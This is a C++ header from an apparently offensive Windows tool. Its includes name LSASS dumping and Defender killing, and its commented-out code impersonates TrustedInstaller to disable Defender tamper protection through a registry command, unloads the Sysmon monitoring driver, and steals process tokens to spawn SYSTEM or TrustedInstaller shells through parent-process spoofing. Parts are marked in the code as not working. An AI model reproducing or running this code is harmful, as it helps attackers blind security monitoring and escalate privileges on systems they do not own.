#pragma once

#include "killProcProtect.h"
#include "dumpLsass.h"
#include "killDefender.h"

/* 
failed to run as trusted installer in new thread
BOOL ImpersonateTrustedInstallerThread(DWORD pid) {
	// Open Process
	HANDLE hProc;
	HANDLE hRemoteThread;
	HANDLE hNewThread;
	HANDLE hCurrentThread;
	DWORD dwNewThreadId;
	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
	if (hProc == INVALID_HANDLE_VALUE)
		return Error("Failed to get handle to trusted installer");
	// get thread list
	vector<DWORD> threadList = GetProcessThreads(pid);
	// open first thread in process <- DONT ACTUALLY KNOW IF ITS FIRST THREAD
	hRemoteThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, threadList[0]);
	if (!hRemoteThread)
		return Error("Failed to get handle to remote thread");
	hNewThread = CreateThread(NULL, 0, DisableTamperProtection, 0, CREATE_SUSPENDED, &dwNewThreadId);
	if (!hNewThread)
		return Error("Failed to create new thread");
	hCurrentThread = GetCurrentThread();
	printf("Attempting to impersonate thread -> %d\n",threadList[0]);
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.Length = sizeof(sqos);
	SetThreadToken(&hNewThread, nullptr);
	pNtImpersonateThread(hNewThread, hRemoteThread,&sqos);
	getchar();
	if (ResumeThread(hNewThread) == -1)
		return Error("Failed to resume thread");
	WaitForSingleObject(hNewThread, INFINITY);
	getchar();
	return TRUE;
}


DWORD WINAPI DisableTamperProtection(LPVOID lpstatus) {
		STARTUPINFO si = {};
		PROCESS_INFORMATION pi = {};
		BOOL ret;
		HANDLE token;
		OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token);
		// cmd /c reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d "0x4" /f
		LPCWSTR params = L"C:\\Windows\\System32\\cmd.exe /c reg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v TamperProtection /t REG_DWORD /d \"0x4\" /f";
		ret = CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", (LPWSTR)params, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
		return 0;
}

vector<DWORD> GetProcessThreads(DWORD pid) {
	vector <DWORD> threadIds;
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return threadIds;
	THREADENTRY32 te = { sizeof(te) };
	if (Thread32First(hSnapshot, &te)) {
		do {
			if (te.th32OwnerProcessID == pid) {
				threadIds.push_back(te.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &te));
	}
	CloseHandle(hSnapshot);
	return threadIds;
}

BOOL unloadMiniFilterDriver() {
	// this works against sysmon but does not work against WdFilter
	// requies SE_LOAD_DRIVER_NAME priv
	HRESULT unload = FilterUnload(L"SysmonDrv");
	if (unload == S_OK) {
		printf("Unloaded!");
		return TRUE;
	}
	printf("%ld\n", unload);
	return Error("Failed to unload driver");
}
/*BOOL WindowsElevateToTrustedInstaller() {
	int trustedInstallerPid = GetProcRunningAsTrustedInstaller();
	if (trustedInstallerPid == 0)
		return Error("Failed to enum processes OR trusted installer not found!");
	printf("Attempting to elevate with pid %d\n", trustedInstallerPid);
	if (GetTrustedInstallerPrivs(trustedInstallerPid)) {
		printf("Elevated via pid %d\n", trustedInstallerPid);
		return TRUE;
	}
	return Error("Failed to elevate to trusted installer");
}

BOOL GetSystemPrivs(DWORD pid) {
	HANDLE hProc;
	HANDLE hProcToken;
	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (hProc == INVALID_HANDLE_VALUE)
		return Error("Failed to get handle to proc");
	if (!OpenProcessToken(hProc, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hProcToken))
		return Error("failed to get proc access token handle");
	//dupe token
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE newToken;
	if (!DuplicateTokenEx(hProcToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &newToken))
		return Error("Failed to duplicate token");
	// create proc with token
	STARTUPINFO si = {};
	PROCESS_INFORMATION pi = {};
	BOOL ret;
	ret = CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!ret)
		return Error("Failed to start process as system");
	return TRUE;

}


int GetProcRunningAsSystem() {
	size_t bufferSize = 102400;
	ULONG ulReturnLength;
	NTSTATUS status;
	int myPid = GetCurrentProcessId();
	int parentPid = -1;
	int parentPidImageSize;
	PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PSYSTEM_PROCESS_INFO procInfo;
	procInfo = (PSYSTEM_PROCESS_INFO)buffer;
	status = pNtQuerySystemInformation(SystemProcessInformation, procInfo, 1024 * 1024, NULL);
	if (status != STATUS_SUCCESS)
		return Error("Failed to query proc list");
	// save into dictionary
	while (procInfo->NextEntryOffset) {
		//get proc info
		procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
		//open handle to proc if you can
		HANDLE procHandle;
		HANDLE procToken;
		procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (int)procInfo->ProcessId);
		// if no handle move to next proccess
		if (procHandle == INVALID_HANDLE_VALUE) {
			continue;
		}
		if (!OpenProcessToken(procHandle, TOKEN_QUERY, &procToken)) {
			continue;
		}
		// if got handle and token get token info to get sid
		TOKEN_OWNER* tokenOwnerBuffer;
		DWORD tokenInfoLength;
		GetTokenInformation(procToken, TokenOwner, NULL, 0, &tokenInfoLength);
		tokenOwnerBuffer = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, tokenInfoLength);
		if (!GetTokenInformation(procToken, TokenOwner, tokenOwnerBuffer, tokenInfoLength, &tokenInfoLength)) {
			printf("failed at get token info");
		}
		DWORD dwSize = 256;
		char userName[256];
		char userDomain[256];
		SID_NAME_USE sidType;
		// get user from SID if fails move to next process
		if (!LookupAccountSidA(NULL, tokenOwnerBuffer->Owner, userName, &dwSize, userDomain, &dwSize, &sidType)) {
			printf("failed to get sid");
			continue;
		}
		if (strncmp(userName, "Administrators", strlen(userName)) == 0) {         //|| strncmp(userName,"Administrators",strlen(userName)) == 0 ) {
			pidMap[(int)procInfo->ProcessId] = procInfo->ImageName.Buffer;
			printf("Image Name: %ws ::: User Name: %s\\%s ::: Pid: %d\n", procInfo->ImageName.Buffer, userDomain, userName, (int)procInfo->ProcessId);
		}
	}
	VirtualFree(buffer, 0, MEM_RELEASE);
	return 1;
}


BOOL WindowsElevateToSystem() {
	if (!GetProcRunningAsSystem())
		return Error("Failed to enum processes");
	for (auto const& x : pidMap) {
		printf("Attempting to elevate with pid %d\n", x.first);
		if (GetSystemPrivs(x.first)) {
			printf("Elevated via pid %d\n", x.first);
			return TRUE;
		}
	}
	return Error("Failed to elevate");
}
BOOL GetTrustedInstallerPrivs(int pid) {
	HANDLE hPrivProc;
	hPrivProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS | PROCESS_VM_READ, FALSE, pid);
	if (hPrivProc == INVALID_HANDLE_VALUE)
		return Error("Failed to get handle to trusted installer");
	STARTUPINFOEXA sinfo = { sizeof(sinfo) };
	PROCESS_INFORMATION pinfo;
	LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
	SIZE_T bytes;

	sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
	ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
	InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
	UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPrivProc, sizeof(HANDLE), NULL, NULL);
	sinfo.lpAttributeList = ptList;
	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sinfo.StartupInfo, &pinfo))
		return Error("Failed to create process as trustedinstaller");
	return TRUE;
}

*/
